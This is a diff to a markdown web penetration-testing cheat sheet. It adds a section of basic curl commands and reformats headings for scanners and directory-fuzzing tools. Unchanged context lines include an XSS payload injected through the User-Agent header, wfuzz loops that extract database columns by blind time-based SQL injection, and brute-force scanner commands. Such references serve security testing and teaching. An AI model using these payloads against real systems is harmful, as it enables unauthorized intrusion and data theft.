@@ -55,6 +55,7 @@
      - [Nikto](#nikto)
      - [Nuclei](#nuclei)
      - [WPScan](#wpscan)
+   - [Curl](#curl)
    - [Directory Discovery](#directory-discovery)
      - [FFUF](#ffuf)
      - [Dirb](#dirb)
@@ -2634,7 +2635,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 > ```
 
 **Scanners**
-# Nikto
+## Nikto
 - ### Installation
 > ```bash
 > sudo apt-get install nikto
@@ -2700,7 +2701,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 > x    # Reverse Tuning Options
 > ```
 
-# Nuclei
+## Nuclei
 
 ### Common Nuclei Commands
 
@@ -2752,7 +2753,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 | **Brute Force Testing**           | ```nuclei -u https://example.com --brute --wordlist wordlist.txt``` | Performs brute force attacks to test password strength.     | Brute forcing with wordlist.txt...         |
 | **Check Configuration**           | ```nuclei -u https://example.com --check-config```     | Checks for insecure configurations and misconfigurations.  | Checking configuration...                |
 
-# WPScan
+## WPScan
 
 ### Common Commands
 - ### Basic Scan
@@ -2848,9 +2849,141 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 > curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resultFromRunningAboveScritpToEncode>))</script>" --proxy 127.0.0.1:8080
 > ```
 
+## Curl
+
+### Basic Requests
+> - GET Request
+> ```bash
+> curl http://example.com
+> ```
+
+> - GET Request with Custom Headers
+> ```bash 
+> curl -H "Accept: application/json" http://example.com
+> ```
+
+### Data Submission
+> - POST Request with Form Data
+> ```bash
+> curl -X POST -d "param1=value1&param2=value2" http://example.com/submit
+> ```
+
+> - POST Request with JSON Data
+> ```bash
+> curl -H "Content-Type: application/json" -X POST -d '{"key1":"value1", "key2":"value2"}' http://example.com/api
+> ```
+
+> - Automatically Perform URL Encoding
+> ```bash
+> curl -X POST -d "param1=value1&param2=value2" --data-urlencode http://example.com/submit
+> ```
+> - PUT Request with Form Data
+> ```bash
+> curl -X PUT -d "param1=value1&param2=value2" http://example.com/update
+> ```
+> - DELETE Request
+> ```bash
+> curl -X DELETE http://example.com/delete
+> ```
+
+### Authentication and Headers
+> - Basic Authentication
+> ```bash
+> curl -u username:password http://example.com
+> ```
+> - Custom User-Agent
+> ```bash
+> curl -A "CustomUserAgent/1.0" http://example.com
+> ```
+
+### Response Handling
+> - Include Response Headers
+> ```bash
+> curl -i http://example.com
+> ```
+
+> - Save Response to File
+> ```bash
+> curl -o filename.html http://example.com
+> ```
+    
+> - Show Response Headers Only
+> ```bash
+> curl -I http://example.com
+> ```
+    
+> - Print Response Body Only
+> ```bash
+> curl -s http://example.com
+> ```
+
+> - Show Detailed Request and Response
+> ```
+> curl -v http://example.com
+> ```
+
+### Cookies and Session Management
+> - Send Cookies
+> ```bash
+> curl -b "cookie1=value1; cookie2=value2" http://example.com
+> ```
+
+> - Save Cookies to File
+> ```bash
+> curl -c cookies.txt http://example.com
+> ```
+
+> - Load Cookies from File
+> ```bash
+> curl -b cookies.txt http://example.com
+> ```
+
+### File Operations
+> - Upload a File
+> ```bash
+> curl -F "file=@path/to/file" http://example.com/upload
+> ```
+
+> - Download a File with Resume Support
+> ```bash
+> curl -C - -o filename http://example.com/file
+> ```
+
+### Proxy and Security
+> - Use a Proxy
+> ```bash
+> curl -x http://proxyserver:port http://example.com
+> ```
+
+> - Use HTTPS and Insecure SSL
+> ```bash
+> curl -k https://example.com
+> ```
+
+### Additional Options
+> - Follow Redirects
+> ```bash
+> curl -L http://example.com
+> ```
+    
+> - Set Timeout
+> ```bash
+> curl --max-time 30 http://example.com
+> ```
+    
+> - Show Only Response Code
+> ```bash
+> curl -s -o /dev/null -w "%{http_code}" http://example.com
+> ```
+    
+> - Use HTTP/2
+> ``` bash
+> curl --http2 http://example.com
+> ```
+
 **Directory Discovery**
 
-# FFUF
+## FFUF
 
 | Command                            | Example Usage                                                | Function                                                        | Output Example                             |
 |------------------------------------|--------------------------------------------------------------|----------------------------------------------------------------|--------------------------------------------|
@@ -2973,7 +3106,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 > ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -u http://<IP Address> -H "Host: FUZZ.<IP Address>" -t 200 -ic -fw 18
 > ```
 
-# Dirb
+## Dirb
 
 - ### Basic directory scanning
 > ```bash
@@ -3028,7 +3161,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 > dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
 > ```
 
-# Gobuster
+## Gobuster
 
 | Command                         | Example Usage                                                  | Function                                                     | Output Example                             |
 |---------------------------------|----------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------|
@@ -3086,7 +3219,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 > gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
 > ```
 
-# Feroxbuster
+## Feroxbuster
 
 | Command                             | Example Usage                                                                                   | Function                                                | Output Example                           |
 |-------------------------------------|-------------------------------------------------------------------------------------------------|--------------------------------------------------------|------------------------------------------|
@@ -3119,7 +3252,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 | **Follow Redirect**                 | ```feroxbuster -u http://<IP Address> -r```                                                      | Follows redirects during scanning                        | Following redirects                      |
 | **Timeout**                         | ```feroxbuster -u http://<IP Address> -T 5```                                                    | Sets the timeout duration to 5 seconds                   | Timeout set to 5 seconds                 |
 
-# Dirsearch
+## Dirsearch
 
 - ### Basic Directory scanning
 > ```bash
@@ -3154,7 +3287,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 > dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt --exclude-status 404,403
 > ```
 
-# WFUZZ
+## WFUZZ
 
 | Command                          | Example Usage                                                                                           | Function                              | Output Example                                              |
 |----------------------------------|---------------------------------------------------------------------------------------------------------|--------------------------------------|-------------------------------------------------------------|
@@ -3201,7 +3334,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 | Determine Column Name with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<TABLE_NAME>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Determines column name via ASCII | |
 | Extract Column Content with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Extracts column content via ASCII | |
 
-# Exposed .git
+## Exposed .git
 
 > 1. Clone [Git-Dumper](https://github.com/arthaud/git-dumper</a></body></html>)
 > ```bash
@@ -3293,4 +3426,7 @@ When testing for IDOR, consider the following:
    
 2. **Enumerate the Possible Values**: If the object reference (such as a file ID or user ID) follows a sequential pattern, we can **enumerate** values to access objects that don’t belong to us.
 
+---
+
+## Wordlists
 
